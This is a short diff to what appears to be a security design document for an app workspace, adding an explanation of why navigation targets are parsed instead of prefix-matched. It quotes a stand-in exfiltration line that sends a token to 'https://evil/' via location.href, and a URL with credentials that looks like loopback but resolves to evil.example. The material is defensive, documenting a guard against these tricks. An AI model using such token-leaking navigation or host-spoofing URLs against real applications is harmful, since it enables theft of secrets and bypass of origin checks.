@@ -4200,7 +4200,11 @@ the workspace, the surface is:
      no CSP directive governs top-level navigation, so
      =location.href = 'https://evil/?' + token= would otherwise still leave,
      carrying whatever it liked in the URL. Any navigation outside the app's own
-     origins is refused (an unreadable target too — fail closed).
+     origins is refused (an unreadable target too — fail closed). The target
+     is *parsed*, never prefix-matched: =http://127.0.0.1:x@evil.example/=
+     starts like a loopback URL, but its host is =evil.example= (the part
+     before =@= is a user name and a password). A URL carrying credentials is
+     refused outright.
 
 The one deliberate exception is =!= shell commands: the user typed them, and
 they can obviously run =curl=.
